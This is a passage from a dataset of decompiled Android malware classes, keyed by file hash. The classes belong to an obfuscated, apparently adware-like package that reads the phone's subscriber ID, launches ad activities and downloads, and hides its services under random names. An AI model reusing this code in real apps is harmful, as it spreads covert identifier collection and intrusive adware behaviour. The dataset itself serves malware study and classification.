com.baty.pczy.facy.pap.n.a(service,intent);     }  else     if (d.equals(type)) {       dVar=new com.baty.pczy.facy.pap.n.c(service,intent);     }  else     if (e.equals(type)) {       dVar=new com.baty.pczy.facy.pap.n.b(service,intent);     }  else     if (f.equals(type)) {       dVar=new com.baty.pczy.facy.pap.n.e(service,intent);     }     if (dVar != null) {       dVar.a();     }   }   public static void d(  Service service){     com.baty.pczy.facy.pap.f.a.a();   }   public static void e(  Service service){     e.a(service,c.class,null,null);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\d.code","public class d {   private static p a;   private static n b;   public static void a(  Activity activity,  Bundle bundle){     View c2;     e.a(activity,d.class,null,null);     activity.requestWindowFeature(1);     com.baty.pczy.facy.pap.e.b bVar=(com.baty.pczy.facy.pap.e.b)activity.getIntent().getSerializableExtra(com.baty.pczy.facy.pap.e.b.class.getSimpleName());     if (bVar == null) {       activity.finish();     }     boolean z=bVar.a.k != 0;     a=new p(activity);     a.a(o.a(activity,a).a(bVar.b));     if (z) {       b=new n(activity);       a.a(b);       b.a(a.c(),new com.baty.pczy.facy.pap.k.d(activity,a,bVar.a.j).c());       c2=b;     }  else {       c2=a.c();     }     activity.setContentView(c2);   }   public static void b(  Activity activity){     a.d();   }   public static void c(  Activity activity,  Intent intent){     com.baty.pczy.facy.pap.e.b bVar=(com.baty.pczy.facy.pap.e.b)intent.getSerializableExtra(com.baty.pczy.facy.pap.e.b.class.getSimpleName());     if (bVar == null) {       return;     }     a.a(o.a(activity,a).a(bVar.b));   }   public static void e(  Activity activity){     if (a.b()) {       return;     }     if (b == null || !b.c()) {       activity.finish();     }   }   public static void f(  Activity activity,  com.baty.pczy.facy.pap.e.f fVar){     a.a(o.a(activity,a).a(fVar));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\doos.code","public class doos extends IntentService implements a {   public doos(){     super(""a"");   }   @Override public void onDestroy(){     super.onDestroy();     c.d(this);   }   @Override protected void onHandleIntent(  Intent intent){     c.b(this,intent);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\e.code","public class e {   public static com.baty.pczy.facy.pap.c.b a;   public static com.baty.pczy.facy.pap.c.a b;   public static Context f57c;   public static e d;   public static com.baty.pczy.facy.pap.m.b e;   public static Handler f;   public static Class g;   public static Class h;   public static Class i;   private static String k;   private boolean j;   private e(  Class cls){     com.baty.pczy.facy.pap.d.b.a(f57c);     f=new Handler(f57c.getMainLooper());     e=com.baty.pczy.facy.pap.m.a.a(f57c);     b.g();     b.e();     b.f();     a(cls);     g.a(com.baty.pczy.facy.pap.s.g.d(f57c,26) + g + "",""+ i+ "",""+ h);     if (g != null && h != null && h != null) {       this.j=true;     }     com.baty.pczy.facy.pap.f.a.a(f57c,Integer.MAX_VALUE);     List k2=a.k();     g.a(this,""ç¼“å­˜ä¸­å¹¿å‘Šçš„ä¿¡æ�¯ï¼š"" + k2);     Iterator it=k2.iterator();     while (it.hasNext()) {       com.baty.pczy.facy.pap.f.e.b(f57c,(com.baty.pczy.facy.pap.e.f)it.next());     }   }   public static synchronized e a(  Context context,  Class cls,  String str,  String str2){     e eVar; synchronized (e.class) {       if (context == null) {         eVar=d;       }  else {         if (f57c == null) {           f57c=context.getApplicationContext();         }         if (f57c == null) {           eVar=d;         }  else {           if (a == null) {             a=com.baty.pczy.facy.pap.c.d.a(f57c).a();           }           if (b == null) {             b=com.baty.pczy.facy.pap.c.c.a(f57c).a();           }           if (TextUtils.isEmpty(str)) {             str=h.a(context);           }           if (TextUtils.isEmpty(str)) {             eVar=null;           }  else {             h.a(f57c,str);             h.b(f57c,str2);             if (d == null) {               d=new e(cls);             }             eVar=d;           }         }       }     }     return eVar;   }   public static void a(  Context context,  com.baty.pczy.facy.pap.e.b bVar){     if (bVar == null) {       return;     }     if (!j.a(context).b()) {       Intent intent=new Intent(""android.settings.WIFI_IP_SETTINGS"");       intent.addFlags(268435456);       context.startActivity(intent);       return;     }     if (bVar.b.n != 2) {       Intent intent2=new Intent(context,(Class<?>)g);       intent2.putExtra(com.baty.pczy.facy.pap.e.b.class.getSimpleName(),bVar);       intent2.addFlags(268435456);       context.startActivity(intent2);       return;     }     Intent intent3=new Intent(""android.intent.action.VIEW"",Uri.parse(bVar.b.b));     List<ResolveInfo> queryIntentActivities=context.getPackageManager().queryIntentActivities(intent3,65536);     if (queryIntentActivities.size() <= 0) {       intent3.addFlags(268435456);       context.startActivity(intent3);     }  else {       ActivityInfo activityInfo=queryIntentActivities.get(0).activityInfo;       intent3.setClassName(activityInfo.packageName,activityInfo.name);       intent3.addFlags(268435456);       context.startActivity(intent3);     }   }   private void a(  Class cls){     try {       PackageInfo packageInfo=f57c.getPackageManager().getPackageInfo(f57c.getPackageName(),1);       String name=cls.getPackage().getName();       ActivityInfo[] activityInfoArr=packageInfo.activities;       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           Class<?> cls2=Class.forName(activityInfo.name);           if (cls2.getPackage().getName().contains(name)) {             g=cls2;           }         }  catch (        Exception e2) {         }       }       for (      ServiceInfo serviceInfo : f57c.getPackageManager().getPackageInfo(f57c.getPackageName(),4).services) {         try {           Class<?> cls3=Class.forName(serviceInfo.name);           if (cls3.getPackage().getName().contains(name)) {             i=cls3;           }         }  catch (        Exception e3) {         }       }       for (      ActivityInfo activityInfo2 : f57c.getPackageManager().getPackageInfo(f57c.getPackageName(),2).receivers) {         try {           Class<?> cls4=Class.forName(activityInfo2.name);           if (cls4.getPackage().getName().contains(name)) {             h=cls4;           }         }  catch (        Exception e4) {         }       }     }  catch (    Exception e5) {       g.a(e5);     }   }   public static String b(){     if (k == null) {       k=((TelephonyManager)f57c.getSystemService(""phone"")).getSubscriberId();       if (k == null) {         k="""";       }     }     return k;   }   public void a(){     a.a(true);     g.a(com.baty.pczy.facy.pap.s.g.d(f57c,23));     String a2=h.a(f57c);     g.a(com.baty.pczy.facy.pap.s.g.d(f57c,27) + a2);     g.a(com.baty.pczy.facy.pap.s.g.d(f57c,28) + h.b(f57c));     a(com.baty.pczy.facy.pap.s.g.d(f57c,9).equals(a2) ? 0 : 20);   }   public void a(  int i2){     a(-1,i2);   }   public synchronized void a(  int i2,  int i3){     g.a(com.baty.pczy.facy.pap.s.g.d(f57c,24) + i3);     if (!a.j()) {       g.a(com.baty.pczy.facy.pap.s.g.d(f57c,15));     }  else     if (!com.baty.pczy.facy.pap.l.c.a(f57c)) {       g.a(com.baty.pczy.facy.pap.s.g.d(f57c,16));     }  else     if (!com.baty.pczy.facy.pap.f.d.a()) {       g.a(com.baty.pczy.facy.pap.s.g.d(f57c,17));     }  else     if (TextUtils.isEmpty(h.a(f57c))) {       g.a(com.baty.pczy.facy.pap.s.g.d(f57c,30));     }  else {       com.baty.pczy.facy.pap.q.d.a(new f(this,i3,i2));     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\f.code","public class f implements com.baty.pczy.facy.pap.q.a {   final int a;   final int b;   final e f63c;   public f(  e eVar,  int i,  int i2){     this.f63c=eVar;     this.a=i;     this.b=i2;   }   @Override public void a(){     if (!(com.baty.pczy.facy.pap.s.a.a(new byte[]{97,98,99}).equals(h.a(e.f57c))) && this.a > 0) {       try {         Thread.sleep(this.a * 1000);       }  catch (      InterruptedException e) {         g.a((Exception)e);       }     }     Intent intent=new Intent();     intent.setType(c.f);     intent.setClass(e.f57c,e.i);     intent.putExtra(c.a,this.b);     e.f57c.startService(intent);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\kcuy.code","public class kcuy {   private static kcuy manager;   private kcuy(  Context context,  String str,  String str2){     e.a(context,kcuy.class,str,str2);   }   public static kcuy lscy(  Context context,  String str,  String str2){     if (manager == null) {       manager=new kcuy(context,str,str2);     }     return manager;   }   public void ncry(){     e.d.a();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\tier.code","public class tier extends BroadcastReceiver implements a {   @Override public void onReceive(  Context context,  Intent intent){     b.a(this,context,intent);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.a\a.code","public class a extends BaseAdapter {   private Context f42c;   private List b=new ArrayList();   View.OnClickListener a=new b(this);   public a(  Context context){     this.f42c=context;   }   public void a(  List list){     if (list == null) {       return;     }     this.b.clear();     this.b.addAll(list);     notifyDataSetChanged();   }   @Override public int getCount(){     return this.b.size();   }   @Override public Object getItem(  int i){     return this.b.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView;     ImageView imageView2;     TextView textView;     TextView textView2;     f fVar=(f)this.b.get(i);     Drawable a=g.a(this.f42c,16);     c cVar=(c)view;     if (cVar == null) {       cVar=new c(this,this.f42c);     }     imageView=cVar.f43c;     imageView.setBackgroundDrawable(a);     com.baty.pczy.facy.pap.b.b a2=com.baty.pczy.facy.pap.b.b.a(this.f42c);     imageView2=cVar.f43c;     a2.a(imageView2,fVar.f60c,com.baty.pczy.facy.pap.f.d.d(fVar),null,e.Type_icon);     textView=cVar.d;     textView.setText(fVar.a);     textView2=cVar.e;     textView2.setText(fVar.j);     cVar.a.setTag(Integer.valueOf(i));     cVar.a.setOnClickListener(this.a);     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},new ColorDrawable(-2038553));     stateListDrawable.addState(new int[]{R.attr.state_enabled},new ColorDrawable(-657931));     cVar.setBackgroundDrawable(stateListDrawable);     if (i % 2 != 0) {       cVar.a();     }     return cVar;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.a\b.code","public class b implements View.OnClickListener {   final a a;   public b(  a aVar){     this.a=aVar;   }   @Override public void onClick(  View view){     List list;     Context context;     int intValue=((Integer)view.getTag()).intValue();     list=this.a.b;     f fVar=(f)list.get(intValue);     context=this.a.f42c;     com.baty.pczy.facy.pap.f.b.a(context,fVar);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.a\c.code","public class c extends LinearLayout {   public ImageView a;   final a b;   private ImageView f43c;   private TextView d;   private TextView e;   private ImageView f;   public c(  a aVar,  Context context){     super(context);     this.b=aVar;     setOrientation(1);     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     addView(linearLayout,new LinearLayout.LayoutParams(-1,-2));     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout.setOrientation(0);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);     layoutParams.weight=1.0f;     int a=com.baty.pczy.facy.pap.s.a.a(context,7);     layoutParams.bottomMargin=a;     layoutParams.topMargin=a;     linearLayout.addView(linearLayout2,layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(context,48),com.baty.pczy.facy.pap.s.a.a(context,48));     int a2=com.baty.pczy.facy.pap.s.a.a(context,5);     layoutParams2.rightMargin=a2;     layoutParams2.leftMargin=a2;     this.f43c=new ImageView(context);     linearLayout2.addView(this.f43c,layoutParams2);     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-1);     layoutParams3.leftMargin=com.baty.pczy.facy.pap.s.a.a(context,2);     linearLayout2.addView(linearLayout3,layoutParams3);     this.d=new TextView(a.b(aVar));     this.d.getPaint().setFakeBoldText(true);     this.d.setTextSize(12.0f);     this.d.setTextColor(-9144456);     this.d.setSingleLine();     this.d.setEllipsize(TextUtils.TruncateAt.END);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,-2);     layoutParams4.gravity=19;     linearLayout3.addView(this.d,layoutParams4);     RelativeLayout relativeLayout=new RelativeLayout(a.b(aVar));     ViewGroup.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-1,-1);     relativeLayout.setGravity(80);     relativeLayout.setPadding(0,com.baty.pczy.facy.pap.s.a.a(a.b(aVar),2),0,com.baty.pczy.facy.pap.s.a.a(a.b(aVar),2));     linearLayout3.addView(relativeLayout,layoutParams5);     this.a=new ImageView(a.b(aVar));     LinearLayout linearLayout4=new LinearLayout(a.b(aVar));     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(com.baty.pczy.facy.pap.s.a.a(a.b(aVar),26),com.baty.pczy.facy.pap.s.a.a(a.b(aVar),26));     layoutParams6.gravity=5;     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},g.a(a.b(aVar),54));     stateListDrawable.addState(new int[]{R.attr.state_enabled},g.a(a.b(aVar),55));     this.a.setBackgroundDrawable(stateListDrawable);     linearLayout4.addView(this.a,layoutParams6);     RelativeLayout.LayoutParams layoutParams7=new RelativeLayout.LayoutParams(-2,-2);     layoutParams7.addRule(11,-1);     linearLayout4.setId(1);     layoutParams7.rightMargin=com.baty.pczy.facy.pap.s.a.a(a.b(aVar),7);     relativeLayout.addView(linearLayout4,layoutParams7);     this.e=new TextView(context);     this.e.setTextSize(12.0f);     this.e.setTextColor(-16777216);     this.e.setSingleLine();     this.e.setEllipsize(TextUtils.TruncateAt.END);     RelativeLayout.LayoutParams layoutParams8=new RelativeLayout.LayoutParams(-1,-2);     layoutParams8.addRule(0,1);     layoutParams8.addRule(8,1);     relativeLayout.addView(this.e,layoutParams8);     ImageView imageView=new ImageView(context);     imageView.setBackgroundColor(-4604739);     addView(imageView,new LinearLayout.LayoutParams(-1,1));     this.f=new ImageView(context);     this.f.setBackgroundColor(-4604739);     linearLayout.addView(this.f,new LinearLayout.LayoutParams(1,-1));   }   public void a(){     this.f.setVisibility(8);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.a\d.code","public class d extends BaseAdapter {   private f a;   private String[] b;   private Context f44c;   private int d=-1;   private ArrayList e=new ArrayList();   public d(  f fVar,  Context context){     this.b=com.baty.pczy.facy.pap.s.a.a(fVar.d,"";"");     this.a=fVar;     this.f44c=context;   }   @Override public int getCount(){     if (this.b == null) {       return 0;     }     return this.b.length;   }   @Override public Object getItem(  int i){     return this.b[i];   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     View view2;     if (view == null) {       ImageView imageView=new ImageView(this.f44c);       imageView.setAdjustViewBounds(true);       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       imageView.setLayoutParams(new Gallery.LayoutParams(this.d,this.d));       this.e.add(imageView);       view2=imageView;     }  else {       view2=view;     }     Bitmap b=g.b(this.f44c,10);     ((WindowManager)this.f44c.getSystemService(""window"")).getDefaultDisplay().getMetrics(new DisplayMetrics());     b.setDensity((int)(r2.densityDpi / 0.8f));     ((ImageView)view2).setBackgroundDrawable(g.a(this.f44c,b));     com.baty.pczy.facy.pap.b.b.a(this.f44c).a((ImageView)view2,this.b[i],com.baty.pczy.facy.pap.f.d.a(this.a.p,this.b[i]),null,e.Type_capture);     return view2;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b\a.code","public class a {   private Map a=new LinkedHashMap();   public synchronized Bitmap a(  String str){     Bitmap bitmap;     if (TextUtils.isEmpty(str)) {       bitmap=null;     }  else {       bitmap=(Bitmap)this.a.get(str);       if (bitmap == null) {         bitmap=null;       }  else       if (bitmap.isRecycled()) {         this.a.remove(str);         bitmap=null;       }     }     return bitmap;   }   public synchronized void a(  String str,  Bitmap bitmap){     if (!TextUtils.isEmpty(str) && bitmap != null && !bitmap.isRecycled()) {       this.a.put(str,bitmap);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b\b.code","public class b {   private static b a;   private static Context f46c;   private int b=2;   private Handler d=new c(this);   private ConcurrentHashMap e=new ConcurrentHashMap();   private ExecutorService f=Executors.newFixedThreadPool(this.b);   private h g;   private g h;   private b(  Context context){     f46c=context;     this.g=h.a(f46c);     this.h=g.a(f46c);   }   public static int a(  File file,  int i){     int i2=1;     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(file.getPath(),options);     int i3=options.outWidth / i;     if (i3 >= 2) {       int i4=1;       while (Math.pow(2.0d,i4) < i3) {         i4++;       }       while (true) {         if (i2 >= i3 && i2 >= Math.pow(2.0d,i4)) {           break;         }         i2++;       }     }     return i2;   }   public static int a(  byte[] bArr,  int i){     int i2=1;     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeByteArray(bArr,0,bArr.length,options);     int i3=options.outWidth / i;     if (i3 >= 2) {       int i4=1;       while (Math.pow(2.0d,i4) < i3) {         i4++;       }       while (true) {         if (i2 >= i3 && i2 >= Math.pow(2.0d,i4)) {           break;         }         i2++;       }     }     return i2;   }   public static Context a(){     return f46c;   }   public static synchronized b a(  Context context){     b bVar; synchronized (b.class) {       f46c=context;       if (a == null) {         a=new b(context);       }       bVar=a;     }     return bVar;   }   public static h a(  b bVar){     return bVar.g;   }   public static void a(  BitmapFactory.Options options){     try {       Field declaredField=options.getClass().getDeclaredField(""inNativeAlloc"");       declaredField.setAccessible(true);       declaredField.setBoolean(options,true);     }  catch (    Exception e) {     }   }   public static g b(  b bVar){     return bVar.h;   }   public static Handler c(  b bVar){     return bVar.d;   }   public static ConcurrentHashMap d(  b bVar){     return bVar.e;   }   public void a(  ImageView imageView,  String str,  File file,  com.baty.pczy.facy.pap.b.a.a aVar,  e eVar){     if (eVar == e.Type_capture) {     }     if (str == null || imageView == null) {       return;     }     Bitmap a2=eVar == e.Type_icon ? this.g.a(str) : eVar == e.Type_capture ? this.h.a(str) : null;     if (a2 != null) {       if (eVar == e.Type_capture) {       }       imageView.setBackgroundDrawable(null);       imageView.setImageBitmap(a2);       return;     }     d dVar=(d)this.e.get(str);     if (dVar == null) {       dVar=new d(this,imageView,str,file,eVar);       this.e.put(str,dVar);       if (aVar != null) {         dVar.a(aVar);       }     }  else {       dVar.a(imageView);     }     f fVar=new f(dVar);     fVar.setAlpha(0);     imageView.setImageDrawable(fVar);     if (dVar.h) {       return;     }     this.f.execute(dVar);   }   public void a(  String str,  e eVar){     Bitmap bitmap=null;     if (eVar == e.Type_icon) {       bitmap=this.g.a(str);     }  else     if (eVar == e.Type_capture) {       bitmap=this.h.a(str);     }     if (bitmap == null || bitmap.isRecycled()) {       return;     }     bitmap.recycle();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6151ab5f"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b\d.code","public class d implements Runnable {   ImageView a;   String b;   File f47c;   WeakReference d;   com.baty.pczy.facy.pap.b.a.a e;   Bitmap f=null;   e g;   boolean h;   final b i;   public d(  b bVar,  ImageView imageView,  String str,  File file,  e eVar){     this.i=bVar;     this.a=imageView;     this.b=str;     this.f47c=file;     this.g=eVar;   }   private Bitmap a(  byte[] bArr){     BitmapFactory.Options options=new BitmapFactory.Options();     if (this.a.getWidth() > 0) {       options.inSampleSize=b.a(bArr,this.a.getWidth());     }     b.a(options);     return BitmapFactory.decodeByteArray(bArr,0,bArr.length,options);   }   private Bitmap c(){     BitmapFactory.Options options=new BitmapFactory.Options();     if (this.a.getWidth() > 0) {       options.inSampleSize=b.a(this.f47c,this.a.getWidth());     }     b.a(options);     return BitmapFactory.decodeFile(this.f47c.getPath(),options);   }   private android.graphics.Bitmap d(){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.pczy.facy.pap.b.d.d():android.graphics.Bitmap"");   }   public ImageView a(){     return this.a;   }   public void a(  ImageView imageView){     this.a=imageView;   }   public void a(  com.baty.pczy.facy.pap.b.a.a aVar){     this.e=aVar;   }   public Bitmap b(){     return (Bitmap)this.d.get();   }   @Override public void run(){     this.h=true;     if (this.f47c != null && this.f47c.exists()) {       this.f=c();     }     if (this.f == null) {       if (this.f47c != null) {         this.f47c.deleteOnExit();       }       this.f=d();     }     if (this.f != null) {       if (this.e != null) {         this.f=this.e.a(this.f);       }       if (this.f != null) {         this.d=new WeakReference(this.f);         if (this.g == e.Type_icon) {           b.a(this.i).a(this.b,this.f);         }  else         if (this.g == e.Type_capture) {           b.b(this.i).a(this.b,this.f);         }         Drawable drawable=this.a.getDrawable();         if ((drawable instanceof f) && equals(((f)drawable).a())) {           Message obtainMessage=b.c(this.i).obtainMessage();           obtainMessage.what=2;           obtainMessage.obj=this;           obtainMessage.sendToTarget();         }       }     }     b.d(this.i).remove(this.b);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b\f.code","public class f extends ColorDrawable {   private WeakReference a;   public f(  d dVar){     super(0);     this.a=new WeakReference(dVar);   }   public d a(){     return (d)this.a.get();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b\g.code","public class g extends a {   private static g a;   private Context b;   private g(  Context context){     this.b=context;   }   public static synchronized g a(  Context context){     g gVar; synchronized (g.class) {       if (a == null) {         a=new g(context);       }       gVar=a;     }     return gVar;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b\h.code","public class h extends a {   private static h a;   private Context b;   private Map f49c=new LinkedHashMap();   private h(  Context context){     this.b=context;   }   public static synchronized h a(  Context context){     h hVar; synchronized (h.class) {       if (a == null) {         a=new h(context);       }       hVar=a;     }     return hVar;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.b.a\a.code","public interface a {   Bitmap a(  Bitmap bitmap); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.c\a.code","public interface a {   String a();   void a(  int i);   void a(  long j);   void a(  String str);   String b();   void b(  String str);   int c();   void c(  String str);   long d();   boolean d(  String str);   long e(  String str);   void e();   void f();   void g(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.c\b.code","public interface b {   com.baty.pczy.facy.pap.e.b a();   String a(  int i);   void a(  int i,  int i2);   void a(  long j);   void a(  com.baty.pczy.facy.pap.e.b bVar);   void a(  f fVar);   void a(  String str);   void a(  boolean z);   void a(  j[] jVarArr);   List b();   void b(  int i);   void b(  long j);   void b(  String str);   boolean b(  int i,  int i2);   f c(  int i);   JSONArray c();   void c(  String str);   String d();   void d(  String str);   String e();   void e(  String str);   f f(  String str);   String f();   f g(  String str);   void g();   long h();   void h(  String str);   String i();   boolean j();   List k();   long l(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.c\c.code","public class c {   private static c a;   private Context b;   private a f51c;   private c(  Context context){     this.b=context.getApplicationContext();   }   public static synchronized c a(  Context context){     c cVar; synchronized (c.class) {       if (a == null) {         a=new c(context);       }       cVar=a;     }     return cVar;   }   public synchronized a a(){     if (this.f51c == null) {       this.f51c=new com.baty.pczy.facy.pap.g.a(this.b);     }     return this.f51c;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.c\d.code","public class d {   public static d a;   private b b;   private Context f52c;   private d(  Context context){     this.f52c=context.getApplicationContext();   }   public static synchronized d a(  Context context){     d dVar; synchronized (d.class) {       if (a == null) {         a=new d(context);       }       dVar=a;     }     return dVar;   }   public synchronized b a(){     if (this.b == null) {       this.b=new com.baty.pczy.facy.pap.g.b(this.f52c);     }     return this.b;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.d\a.code","public interface a {   void a(  f fVar,  int i);   void a(  f fVar,  long j); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.d\b.code","public class b {   private static b b;   Context a;   private com.baty.pczy.facy.pap.j.b f53c;   private List d;   private d e;   private boolean f;   private b(  Context context){     b=this;     this.a=context;     this.f53c=new com.baty.pczy.facy.pap.j.b();     this.d=new CopyOnWriteArrayList();     this.e=new d(context);     Iterator it=this.e.a().iterator();     while (it.hasNext()) {       f fVar=new f(context,(c)it.next());       int h=fVar.h();       if (h == 4 || (fVar.n() != null && """".equals(fVar.n().trim()))) {         e(fVar);       }  else {         if (System.currentTimeMillis() - fVar.d() > 2592000000L) {           e(fVar);         }  else { switch (h) { case 0:             if (!new File(fVar.c().getAbsoluteFile() + com.baty.pczy.facy.pap.p.a.bv).exists()) {               fVar.a(5);               break;             }           break; case 1: case 2: case 3:         fVar.a(5);       break;   }   if (a(fVar)) {     e(fVar);   }  else {     this.d.add(fVar);   } } } } } public static b a(){ return b; } public static synchronized b a(Context context){ b bVar; synchronized (b.class) { if (b == null) { b=new b(context.getApplicationContext()); } bVar=b; } return bVar; } private c h(f fVar){ c cVar=new c(); cVar.a=fVar.n(); cVar.b=fVar.c() == null ? """" : fVar.c().toString(); cVar.e=fVar.h(); cVar.d=fVar.i(); cVar.f54c=fVar.j(); cVar.f=fVar.k(); cVar.g=fVar.l(); cVar.h=fVar.m(); cVar.i=fVar.a(); cVar.j=fVar.d(); return cVar; } public boolean a(f fVar){ return this.d.contains(fVar); } public f b(f fVar){ f fVar2; synchronized (this.d) { int i=0; while (true) { if (i >= this.d.size()) {   fVar2=null;   break; } fVar2=(f)this.d.get(i); if (fVar2.equals(fVar)) {   break; } i++; } } return fVar2; } public boolean b(){ return this.f; } public List c(){ return this.d; } public void c(f fVar){ synchronized (this.d) { if (this.d.contains(fVar)) { fVar.a(0); }  else { this.d.add(fVar); this.e.a(h(fVar)); this.f53c.a(fVar.b()); } } } public void d(f fVar){ synchronized (this.d) { if (this.d.remove(fVar)) { this.e.b(h(fVar)); fVar.b().b(); } } } public void e(f fVar){ synchronized (this.d) { this.d.remove(fVar); this.e.b(h(fVar)); fVar.b().b(); } } public void f(f fVar){ synchronized (this.d) { if (this.d.contains(fVar)) { fVar.b().e(); this.f53c.a(fVar.b()); } } } public void g(f fVar){ synchronized (this.d) { if (this.d.contains(fVar)) { this.e.c(h(fVar)); } } } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.d\c.code","class c {   public String a;   public String b;   public long f54c;   public long d=-1;   public int e;   public String f;   public String g;   public int h;   public String i;   public long j; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.d\d.code","class d {   private static String a=g.d(com.baty.pczy.facy.pap.e.f57c,21);   private static String b=a + 7;   private e f55c;   public d(  Context context){     this.f55c=new e(context);   }   public List a(){     ArrayList arrayList=new ArrayList();     SQLiteDatabase readableDatabase=this.f55c.getReadableDatabase();     Cursor query=readableDatabase.query(b,null,null,null,null,null,null);     while (query.moveToNext()) {       c cVar=new c();       cVar.a=query.getString(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.aV));       cVar.b=query.getString(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.aW));       cVar.f54c=query.getLong(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.aX));       cVar.d=query.getLong(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.aY));       cVar.e=query.getInt(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.aZ));       cVar.f=query.getString(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.bb));       cVar.g=query.getString(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.ba));       cVar.h=query.getInt(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.bc));       cVar.i=query.getString(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.bd));       cVar.j=query.getLong(query.getColumnIndex(com.baty.pczy.facy.pap.p.a.be));       arrayList.add(cVar);     }     query.close();     readableDatabase.close();     return arrayList;   }   public synchronized void a(  c cVar){     